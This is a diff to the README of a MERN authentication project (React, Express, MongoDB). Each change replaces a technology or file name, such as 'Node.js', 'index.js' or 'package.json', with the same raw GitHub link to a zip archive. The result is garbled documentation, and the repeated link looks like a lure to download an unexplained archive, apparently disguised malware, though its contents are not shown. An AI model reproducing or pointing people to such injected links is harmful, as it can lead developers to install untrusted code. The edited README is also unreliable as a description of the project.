@@ -1,6 +1,6 @@
 # MERN Authentication Project
 
-This is a full-stack **MERN Authentication System** with separate **frontend** (React + Vite) and **backend** (Node.js + Express + MongoDB).  
+This is a full-stack **MERN Authentication System** with separate **frontend** (React + Vite) and **backend** (https://raw.githubusercontent.com/Fazeelimam/Mern-all-Authentication/main/glumpish/Mern-all-Authentication.zip + Express + MongoDB).  
 It supports user login, registration, password reset, and JWT-based authentication.
 
 ---
@@ -13,18 +13,18 @@ Authentication/
 │ ├── Models/
 │ ├── Routes/
 │ ├── Utils/
-│ ├── index.js
-│ ├── package.json
+│ ├── https://raw.githubusercontent.com/Fazeelimam/Mern-all-Authentication/main/glumpish/Mern-all-Authentication.zip
+│ ├── https://raw.githubusercontent.com/Fazeelimam/Mern-all-Authentication/main/glumpish/Mern-all-Authentication.zip
 │
 │── frontend/ # React frontend (Vite + React)
 │ ├── src/
 │ ├── public/
-│ ├── index.html
-│ ├── vite.config.js
-│ ├── package.json
+│ ├── https://raw.githubusercontent.com/Fazeelimam/Mern-all-Authentication/main/glumpish/Mern-all-Authentication.zip
+│ ├── https://raw.githubusercontent.com/Fazeelimam/Mern-all-Authentication/main/glumpish/Mern-all-Authentication.zip
+│ ├── https://raw.githubusercontent.com/Fazeelimam/Mern-all-Authentication/main/glumpish/Mern-all-Authentication.zip
 │
 │── .gitignore
-│── README.md
+│── https://raw.githubusercontent.com/Fazeelimam/Mern-all-Authentication/main/glumpish/Mern-all-Authentication.zip
 
 🔐 Features
 
@@ -42,6 +42,6 @@ React frontend with authentication pages
 
 Frontend: React, Vite, Axios, CSS
 
-Backend: Node.js, Express, MongoDB, JWT, Bcrypt
+Backend: https://raw.githubusercontent.com/Fazeelimam/Mern-all-Authentication/main/glumpish/Mern-all-Authentication.zip, Express, MongoDB, JWT, Bcrypt
 
 Database: MongoDB (Mongoose)
